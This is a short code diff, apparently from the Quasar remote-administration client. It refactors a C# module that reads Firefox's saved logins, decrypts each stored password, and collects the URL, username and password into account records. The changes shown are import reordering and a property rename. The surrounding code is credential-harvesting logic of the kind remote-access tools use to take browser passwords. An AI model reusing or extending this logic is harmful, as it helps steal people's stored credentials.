@@ -1,16 +1,16 @@
-﻿using System;
+﻿using Microsoft.Win32;
+using Quasar.Common.Models;
+using System;
 using System.Collections.Generic;
 using System.ComponentModel;
+using System.Diagnostics;
 using System.IO;
 using System.Runtime.InteropServices;
 using System.Text;
-using Microsoft.Win32;
-using xClient.Core.Data;
-using xClient.Core.Recovery.Utilities;
-using xClient.Core.Utilities;
-using System.Diagnostics;
 using xClient.Core.Extensions;
 using xClient.Core.Helper;
+using xClient.Core.Recovery.Utilities;
+using xClient.Core.Utilities;
 
 namespace xClient.Core.Recovery.Browsers
 {
@@ -80,7 +80,7 @@ namespace xClient.Core.Recovery.Browsers
                     string password = Decrypt(data.encryptedPassword);
                     Uri host = new Uri(data.formSubmitURL);
 
-                    firefoxPasswords.Add(new RecoveredAccount() { URL = host.AbsoluteUri, Username = username, Password = password, Application = "Firefox" });
+                    firefoxPasswords.Add(new RecoveredAccount { Url = host.AbsoluteUri, Username = username, Password = password, Application = "Firefox" });
                 }
             }
             catch (Exception)
